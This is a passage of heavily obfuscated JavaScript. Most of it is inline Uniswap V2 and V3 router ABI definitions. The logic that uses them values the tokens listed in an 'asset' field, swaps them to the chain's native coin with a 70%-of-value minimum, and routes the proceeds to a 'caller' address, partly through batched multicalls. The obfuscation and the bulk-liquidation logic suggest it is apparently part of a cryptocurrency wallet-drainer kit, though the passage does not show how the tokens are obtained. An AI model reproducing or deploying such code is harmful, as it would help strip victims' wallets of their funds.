              'internalType': "uint256[]",
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x352b5a = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x1ee56a = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x2f8fe8 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x5407de = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x3c71e5 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x48ad58 = {
            inputs: [_0x352b5a, _0x1ee56a, _0x2f8fe8, _0x5407de, _0x3c71e5],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x524b6c = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x2b4c42 = [_0x1a0da6, _0x45d773, _0x11c20e, _0x332150, _0x46cfbd, _0x3c4a1a, _0x1184a9, _0x422403, _0x75f3bf, _0x3329ac, _0x523001, _0x5b71e8, _0x378da9, _0x536dc5, _0x30bd79, _0x17f1dc, _0x1e72e6, _0x2a287a, _0x40413e, _0x38c579, _0x3e91f0, _0xcaa1bd, _0x2cfc5a, _0x4d711f, _0x48ad58, _0x524b6c];
          let _0x181335 = new ethers.Contract(_0x3941f8, _0x2b4c42, _0xab3127);
          let _0x3978e0 = await _0x181335.WETH();
          let _0x5e3cee = [];
          _0x5e3cee[0] = _0x2a18aa.asset.token;
          _0x5e3cee[1] = _0x3978e0;
          try {
            let _0x4c63e7 = this.token_array.find(_0x249a23 => _0x249a23.token_address == _0x2a18aa.asset.token && _0x249a23.chain == _0x2a18aa.chain);
            let _0xe0af46 = this.token_array.find(_0x113af9 => _0x113af9.token_address == "native" && _0x113af9.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x4c63e7.value) * Number(0.7) / Number(_0xe0af46.price)).toString(), 'ether'));
          } catch {}
          return [_0x181335.swapExactTokensForETH(_0x2a18aa.asset.amount, _0xcd0737, _0x5e3cee, this.getCaller(_0x2a18aa), _0x4d5eff), _0x3978e0];
        }
      case "UniswapV3":
        {
          const _0x382c82 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x4de678 = {
            internalType: "address",
            name: "_WETH9",
            type: "address"
          };
          const _0x5bbe5c = {
            inputs: [_0x382c82, _0x4de678],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x5097a7 = {
            inputs: [],
            name: "WETH9",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x7cfca2 = {
            internalType: 'bytes',
            name: 'path',
            type: "bytes"
          };
          const _0x2c578f = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x181f9d = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x1aeb5f = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x4a82f0 = {
            internalType: 'uint256',
            name: "amountOutMinimum",
            type: 'uint256'
          };
          const _0x3f35b5 = {
            components: [_0x7cfca2, _0x2c578f, _0x181f9d, _0x1aeb5f, _0x4a82f0],
            internalType: "struct ISwapRouter.ExactInputParams",
            name: "params",
            type: "tuple"
          };
          const _0x2e0a77 = {
            inputs: [_0x3f35b5],
            name: 'exactInput',
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': "uint256"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x270090 = {
            internalType: "address",
            name: 'tokenIn',
            type: "address"
          };
          const _0x137a7f = {
            internalType: "address",
            name: "tokenOut",
            type: "address"
          };
          const _0x592973 = {
            internalType: "uint24",
            name: "fee",
            type: "uint24"
          };
          const _0xf4f45 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x179dd9 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x18bbf2 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x259d93 = {
            internalType: 'uint256',
            name: "amountOutMinimum",
            type: 'uint256'
          };
          const _0x41b67e = {
            internalType: 'uint160',
            name: "sqrtPriceLimitX96",
            type: 'uint160'
          };
          const _0x34a03d = {
            components: [_0x270090, _0x137a7f, _0x592973, _0xf4f45, _0x179dd9, _0x18bbf2, _0x259d93, _0x41b67e],
            internalType: "struct ISwapRouter.ExactInputSingleParams",
            name: "params",
            type: "tuple"
          };
          const _0x1275e7 = {
            inputs: [_0x34a03d],
            name: "exactInputSingle",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x235a4d = {
            internalType: "bytes",
            name: 'path',
            type: "bytes"
          };
          const _0x71be6c = {
            internalType: "address",
            name: "recipient",
            type: "address"
          };
          const _0x2d65e7 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x170c71 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x41dad4 = {
            internalType: 'uint256',
            name: "amountInMaximum",
            type: 'uint256'
          };
          const _0x214105 = {
            components: [_0x235a4d, _0x71be6c, _0x2d65e7, _0x170c71, _0x41dad4],
            internalType: "struct ISwapRouter.ExactOutputParams",
            name: "params",
            type: "tuple"
          };
          const _0x1432ea = {
            inputs: [_0x214105],
            name: "exactOutput",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x172c46 = {
            internalType: "address",
            name: "tokenIn",
            type: "address"
          };
          const _0x4e7e04 = {
            internalType: "address",
            name: "tokenOut",
            type: "address"
          };
          const _0xd717f9 = {
            internalType: "uint24",
            name: 'fee',
            type: "uint24"
          };
          const _0x1ecf36 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x52cac2 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x22667d = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x50d181 = {
            internalType: 'uint256',
            name: "amountInMaximum",
            type: 'uint256'
          };
          const _0x556274 = {
            internalType: 'uint160',
            name: "sqrtPriceLimitX96",
            type: 'uint160'
          };
          const _0x2cbb88 = {
            components: [_0x172c46, _0x4e7e04, _0xd717f9, _0x1ecf36, _0x52cac2, _0x22667d, _0x50d181, _0x556274],
            internalType: "struct ISwapRouter.ExactOutputSingleParams",
            name: "params",
            type: "tuple"
          };
          const _0x5198bd = {
            inputs: [_0x2cbb88],
            name: "exactOutputSingle",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountIn',
              'type': "uint256"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x37934 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5ad6a8 = {
            internalType: "bytes[]",
            name: "data",
            type: "bytes[]"
          };
          const _0x116887 = {
            inputs: [_0x5ad6a8],
            name: 'multicall',
            outputs: [{
              'internalType': "bytes[]",
              'name': "results",
              'type': "bytes[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x173343 = {
            inputs: [],
            name: 'refundETH',
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5c706d = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x31abd5 = {
            internalType: 'uint256',
            name: 'value',
            type: 'uint256'
          };
          const _0x42ad9e = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x46cb11 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x1ddf1f = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x569ebf = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x44fac6 = {
            inputs: [_0x5c706d, _0x31abd5, _0x42ad9e, _0x46cb11, _0x1ddf1f, _0x569ebf],
            name: "selfPermit",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x61c0ad = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x417381 = {
            internalType: 'uint256',
            name: "nonce",
            type: "uint256"
          };
          const _0x37d3a0 = {
            internalType: 'uint256',
            name: "expiry",
            type: 'uint256'
          };
          const _0x432a08 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x24dc04 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x54f13a = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x1ed58b = {
            inputs: [_0x61c0ad, _0x417381, _0x37d3a0, _0x432a08, _0x24dc04, _0x54f13a],
            name: "selfPermitAllowed",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x58a587 = {
            internalType: 'address',
            name: 'token',
            type: "address"
          };
          const _0x3f56c0 = {
            internalType: 'uint256',
            name: "nonce",
            type: 'uint256'
          };
          const _0x5594c1 = {
            internalType: 'uint256',
            name: "expiry",
            type: 'uint256'
          };
          const _0x4cd122 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x398771 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x2102ff = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0xd3e5de = {
            inputs: [_0x58a587, _0x3f56c0, _0x5594c1, _0x4cd122, _0x398771, _0x2102ff],
            name: "selfPermitAllowedIfNecessary",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5a0ebf = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x173e01 = {
            internalType: 'uint256',
            name: "value",
            type: 'uint256'
          };
          const _0x4692a4 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x435b0b = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x213a7f = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x543611 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x5250c3 = {
            inputs: [_0x5a0ebf, _0x173e01, _0x4692a4, _0x435b0b, _0x213a7f, _0x543611],
            name: "selfPermitIfNecessary",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4624ce = {
            internalType: "address",
            name: 'token',
            type: 'address'
          };
          const _0x199fd5 = {
            internalType: "uint256",
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x454dae = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x42ad6e = {
            inputs: [_0x4624ce, _0x199fd5, _0x454dae],
            name: "sweepToken",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x260295 = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x5c07e2 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x3544a7 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x25846d = {
            internalType: 'uint256',
            name: 'feeBips',
            type: 'uint256'
          };
          const _0x190e9d = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x225915 = {
            inputs: [_0x260295, _0x5c07e2, _0x3544a7, _0x25846d, _0x190e9d],
            name: "sweepTokenWithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x32919d = {
            internalType: "int256",
            name: "amount0Delta",
            type: "int256"
          };
          const _0x15b01a = {
            internalType: "int256",
            name: "amount1Delta",
            type: "int256"
          };
          const _0x3fc5a2 = {
            internalType: "bytes",
            name: '_data',
            type: "bytes"
          };
          const _0x59c961 = {
            inputs: [_0x32919d, _0x15b01a, _0x3fc5a2],
            name: "uniswapV3SwapCallback",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2a2c2f = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x491d59 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x787a9d = {
            inputs: [_0x2a2c2f, _0x491d59],
            name: "unwrapWETH9",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3c36d9 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: "uint256"
          };
          const _0x17d5c5 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x3f8d18 = {
            internalType: 'uint256',
            name: "feeBips",
            type: "uint256"
          };
          const _0x554c1f = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x1cedb8 = {
            inputs: [_0x3c36d9, _0x17d5c5, _0x3f8d18, _0x554c1f],
            name: "unwrapWETH9WithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5b41e0 = {
            stateMutability: "payable",
            type: "receive"
          };
          let _0x28d3b4 = [_0x5bbe5c, _0x5097a7, _0x2e0a77, _0x1275e7, _0x1432ea, _0x5198bd, _0x37934, _0x116887, _0x173343, _0x44fac6, _0x1ed58b, _0xd3e5de, _0x5250c3, _0x42ad6e, _0x225915, _0x59c961, _0x787a9d, _0x1cedb8, _0x5b41e0];
          let _0xd00a31 = new ethers.Contract(_0x3941f8, _0x28d3b4, _0xab3127);
          let _0x11d433 = await _0xd00a31.WETH9();
          let _0x12e46b = _0x2a18aa.asset;
          let _0x48e250 = [];
          for (let _0x592742 of _0x12e46b) {
            try {
              let _0x1ab971 = this.token_array.find(_0x127994 => _0x127994.token_address == _0x592742.token && _0x127994.chain == _0x2a18aa.chain);
              let _0x1deaf9 = this.token_array.find(_0x4dbd38 => _0x4dbd38.token_address == "native" && _0x4dbd38.chain == _0x2a18aa.chain);
              _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x1ab971.value) * Number(0.7) / Number(_0x1deaf9.price)).toString(), 'ether'));
            } catch {}
            let _0x14c3f3 = _0xd00a31["interface"].encodeFunctionData("exactInputSingle", [[_0x592742.token, _0x11d433, 3000, this.getCaller(_0x2a18aa), _0x4d5eff, _0x592742.amount, _0xcd0737, 0]]);
            _0x48e250.push(_0x14c3f3);
          }
          let _0x1f3c6f = _0xd00a31["interface"].encodeFunctionData("multicall(bytes[])", [_0x48e250]);
          let _0x284cc0 = {
            'to': _0x3941f8,
            'from': await this.getWalletAddress(),
            'data': _0x1f3c6f
          };
          return [_0xab3127.sendTransaction(_0x284cc0), _0x11d433];
        }
      case "UniswapV3_2":
        {
          const _0x48f458 = {
            internalType: "address",
            name: "_factoryV2",
            type: "address"
          };
          const _0x3e4239 = {
            internalType: "address",
            name: 'factoryV3',
            type: "address"
          };
          const _0x234deb = {
            internalType: 'address',
            name: "_positionManager",
            type: "address"
          };
          const _0x1a3dc9 = {
            internalType: "address",
            name: "_WETH9",
            type: "address"
          };
          const _0x229efc = {
            inputs: [_0x48f458, _0x3e4239, _0x234deb, _0x1a3dc9],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x1444dc = {
            inputs: [],
            name: "WETH9",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2d4696 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x4dcfdd = {
            inputs: [_0x2d4696],
            name: "approveMax",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x135fa0 = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x2feb14 = {
            inputs: [_0x135fa0],
            name: "approveMaxMinusOne",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x43dd18 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x408ad0 = {
            inputs: [_0x43dd18],
            name: "approveZeroThenMax",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x270870 = {
            internalType: 'address',
            name: 'token',
            type: "address"
          };
          const _0x5a761f = {
            inputs: [_0x270870],
            name: "approveZeroThenMaxMinusOne",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x36ede1 = {
            internalType: "bytes",
            name: "data",
            type: "bytes"
          };
          const _0x39110d = {
            inputs: [_0x36ede1],
            name: "callPositionManager",
            outputs: [{
              'internalType': "bytes",
              'name': "result",
              'type': 'bytes'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2b1495 = {
            internalType: "bytes[]",
            name: "paths",
            type: "bytes[]"
          };
          const _0x3a1c04 = {
            internalType: 'uint128[]',
            name: "amounts",
            type: 'uint128[]'
          };
          const _0xc40434 = {
            internalType: "uint24",
            name: "maximumTickDivergence",
            type: "uint24"
          };
          const _0x2074b2 = {
            internalType: "uint32",
            name: "secondsAgo",
            type: "uint32"
          };
          const _0x3455b9 = {
            inputs: [_0x2b1495, _0x3a1c04, _0xc40434, _0x2074b2],
            name: "checkOracleSlippage",
            outputs: [],
            stateMutability: "view",
            type: 'function'
          };
          const _0x3f96fa = {
            internalType: "bytes",
            name: "path",
            type: "bytes"
          };
          const _0x14136d = {
            internalType: "uint24",
            name: "maximumTickDivergence",
            type: "uint24"
          };
          const _0x3b8d1f = {
            internalType: "uint32",
            name: "secondsAgo",
            type: "uint32"
          };
          const _0x1e178e = {
            inputs: [_0x3f96fa, _0x14136d, _0x3b8d1f],
            name: "checkOracleSlippage",
            outputs: [],
            stateMutability: "view",
            type: "function"
          };
          const _0x44e29e = {
            internalType: "bytes",
            name: 'path',
            type: "bytes"
          };
          const _0x5240c8 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x4f8682 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x411c1d = {
            internalType: 'uint256',
            name: "amountOutMinimum",
            type: 'uint256'
          };
          const _0x2921de = {
            components: [_0x44e29e, _0x5240c8, _0x4f8682, _0x411c1d],
            internalType: "struct IV3SwapRouter.ExactInputParams",
            name: "params",
            type: "tuple"
          };
          const _0x12bc8a = {
            inputs: [_0x2921de],
            name: 'exactInput',
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5b243c = {
            internalType: "address",
            name: "tokenIn",
            type: "address"
          };
          const _0x4688b1 = {
            internalType: "address",
            name: "tokenOut",
            type: "address"
          };
          const _0x3e7c6b = {
            internalType: "uint24",
            name: "fee",
            type: "uint24"
          };
          const _0x20dd74 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x599598 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x1bbe86 = {
            internalType: 'uint256',
            name: "amountOutMinimum",
            type: 'uint256'
          };
          const _0x473659 = {
            internalType: 'uint160',
            name: "sqrtPriceLimitX96",
            type: 'uint160'
          };
          const _0x46b726 = {
            components: [_0x5b243c, _0x4688b1, _0x3e7c6b, _0x20dd74, _0x599598, _0x1bbe86, _0x473659],
            internalType: "struct IV3SwapRouter.ExactInputSingleParams",
            name: "params",
            type: "tuple"
          };
          const _0x1211fa = {
            inputs: [_0x46b726],
            name: "exactInputSingle",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountOut",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xdc6600 = {
            internalType: "bytes",
            name: 'path',
            type: "bytes"
          };
          const _0x24d3b9 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0xe5912d = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x2927dc = {
            internalType: 'uint256',
            name: "amountInMaximum",
            type: 'uint256'
          };
          const _0x35cfe0 = {
            components: [_0xdc6600, _0x24d3b9, _0xe5912d, _0x2927dc],
            internalType: "struct IV3SwapRouter.ExactOutputParams",
            name: "params",
            type: "tuple"
          };
          const _0x2e1592 = {
            inputs: [_0x35cfe0],
            name: "exactOutput",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x37aceb = {
            internalType: "address",
            name: "tokenIn",
            type: "address"
          };
          const _0x5c3edf = {
            internalType: "address",
            name: "tokenOut",
            type: "address"
          };
          const _0x1bc474 = {
            internalType: "uint24",
            name: "fee",
            type: "uint24"
          };
          const _0x5d97c5 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x33daca = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x1de984 = {
            internalType: "uint256",
            name: "amountInMaximum",
            type: 'uint256'
          };
          const _0x2d05cd = {
            internalType: "uint160",
            name: "sqrtPriceLimitX96",
            type: "uint160"
          };
          const _0x20b021 = {
            components: [_0x37aceb, _0x5c3edf, _0x1bc474, _0x5d97c5, _0x33daca, _0x1de984, _0x2d05cd],
            internalType: "struct IV3SwapRouter.ExactOutputSingleParams",
            name: "params",
            type: "tuple"
          };
          const _0x5d0bc1 = {
            inputs: [_0x20b021],
            name: "exactOutputSingle",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountIn',
              'type': 'uint256'
            }],
            stateMutability: 'payable',
            type: "function"
          };
          const _0x1af2f2 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5dd94f = {
            inputs: [],
            name: "factoryV2",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x327eaf = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x28ec18 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x58d855 = {
            inputs: [_0x327eaf, _0x28ec18],
            name: "getApprovalType",
            outputs: [{
              'internalType': "enum IApproveAndCall.ApprovalType",
              'name': '',
              'type': "uint8"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x38dddd = {
            internalType: "address",
            name: "token0",
            type: "address"
          };
          const _0x19bc90 = {
            internalType: "address",
            name: "token1",
            type: "address"
          };
          const _0x353a05 = {
            internalType: 'uint256',
            name: "tokenId",
            type: 'uint256'
          };
          const _0x4ae54a = {
            internalType: 'uint256',
            name: "amount0Min",
            type: 'uint256'
          };
          const _0x2eb5e2 = {
            internalType: 'uint256',
            name: 'amount1Min',
            type: 'uint256'
          };
          const _0xa0255c = {
            components: [_0x38dddd, _0x19bc90, _0x353a05, _0x4ae54a, _0x2eb5e2],
            internalType: "struct IApproveAndCall.IncreaseLiquidityParams",
            name: "params",
            type: "tuple"
          };
          const _0x15e893 = {
            inputs: [_0xa0255c],
            name: "increaseLiquidity",
            outputs: [{
              'internalType': "bytes",
              'name': "result",
              'type': "bytes"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xd58778 = {
            internalType: 'address',
            name: "token0",
            type: "address"
          };
          const _0x1aa0df = {
            internalType: "address",
            name: "token1",
            type: 'address'
          };
          const _0x5b1a85 = {
            internalType: "uint24",
            name: "fee",
            type: "uint24"
          };
          const _0x53492a = {
            internalType: "int24",
            name: "tickLower",
            type: "int24"
          };
          const _0x1a27a0 = {
            internalType: "int24",
            name: "tickUpper",
            type: "int24"
          };
          const _0x21de3e = {
            internalType: 'uint256',
            name: "amount0Min",
            type: "uint256"
          };
          const _0x45be21 = {
            internalType: "uint256",
            name: 'amount1Min',
            type: 'uint256'
          };
          const _0x23c8b8 = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0xaa3c64 = {
            components: [_0xd58778, _0x1aa0df, _0x5b1a85, _0x53492a, _0x1a27a0, _0x21de3e, _0x45be21, _0x23c8b8],
            internalType: "struct IApproveAndCall.MintParams",
            name: "params",
            type: "tuple"
          };
          const _0x25b78f = {
            inputs: [_0xaa3c64],
            name: 'mint',
            outputs: [{
              'internalType': "bytes",
              'name': "result",
              'type': "bytes"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x1e95ac = {
            internalType: "bytes32",
            name: "previousBlockhash",
            type: "bytes32"
          };
          const _0x47b11d = {
            internalType: "bytes[]",
            name: "data",
            type: "bytes[]"
          };
          const _0x106ce3 = {
            inputs: [_0x1e95ac, _0x47b11d],
            name: 'multicall',
            outputs: [{
              'internalType': "bytes[]",
              'name': '',
              'type': "bytes[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x507d82 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x198b19 = {
            internalType: "bytes[]",
            name: 'data',
            type: "bytes[]"
          };
          const _0xc3548d = {
            internalType: "bytes[]",
            name: '',
            type: "bytes[]"
          };
          const _0x24f80f = {
            inputs: [_0x507d82, _0x198b19],
            name: 'multicall',
            outputs: [_0xc3548d],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2fb1e5 = {
            internalType: "bytes[]",
            name: "data",
            type: "bytes[]"
          };
          const _0x494132 = {
            internalType: "bytes[]",
            name: "results",
            type: "bytes[]"
          };
          const _0x9567d9 = {
            inputs: [_0x2fb1e5],
            name: "multicall",
            outputs: [_0x494132],
            stateMutability: 'payable',
            type: "function"
          };
          const _0x55616b = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x35615e = {
            inputs: [],
            name: "positionManager",
            outputs: [_0x55616b],
            stateMutability: "view",
            type: "function"
          };
          const _0x4e7c02 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0xcab807 = {
            internalType: 'uint256',
            name: "value",
            type: "uint256"
          };
          const _0x321247 = {
            inputs: [_0x4e7c02, _0xcab807],
            name: 'pull',
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x48dfc6 = {
            inputs: [],
            name: 'refundETH',
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x428df3 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x4efae7 = {
            internalType: 'uint256',
            name: "value",
            type: 'uint256'
          };
          const _0x43926a = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x476732 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x55347c = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x395d4c = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x153e89 = {
            inputs: [_0x428df3, _0x4efae7, _0x43926a, _0x476732, _0x55347c, _0x395d4c],
            name: 'selfPermit',
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x43de42 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x5ef931 = {
            internalType: 'uint256',
            name: "nonce",
            type: "uint256"
          };
          const _0x17ae07 = {
            internalType: 'uint256',
            name: "expiry",
            type: 'uint256'
          };
          const _0x18f910 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x90d7ee = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x1fb79f = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x85504a = {
            inputs: [_0x43de42, _0x5ef931, _0x17ae07, _0x18f910, _0x90d7ee, _0x1fb79f],
            name: "selfPermitAllowed",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x47455a = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x1f62eb = {
            internalType: 'uint256',
            name: "nonce",
            type: 'uint256'
          };
          const _0x4c464a = {
            internalType: "uint256",
            name: "expiry",
            type: 'uint256'
          };
          const _0x2efa78 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x4cac7a = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x2a3a79 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x5afe6d = {
            inputs: [_0x47455a, _0x1f62eb, _0x4c464a, _0x2efa78, _0x4cac7a, _0x2a3a79],
            name: "selfPermitAllowedIfNecessary",
            outputs: [],
            stateMutability: 'payable',
            type: "function"
          };
          const _0x2ad55c = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x1fa30f = {
            internalType: 'uint256',
            name: "value",
            type: 'uint256'
          };
          const _0x59876c = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2bf95f = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x1dc115 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x43c4a2 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x4bdfac = {
            inputs: [_0x2ad55c, _0x1fa30f, _0x59876c, _0x2bf95f, _0x1dc115, _0x43c4a2],
            name: "selfPermitIfNecessary",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3e181c = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x2eeb3d = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x79dee7 = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0x44cee6 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2318b8 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x36a94d = {
            inputs: [_0x3e181c, _0x2eeb3d, _0x79dee7, _0x44cee6],
            name: "swapExactTokensForTokens",
            outputs: [_0x2318b8],
            stateMutability: 'payable',
            type: "function"
          };
          const _0x30b91d = {
            internalType: "uint256",
            name: 'amountOut',
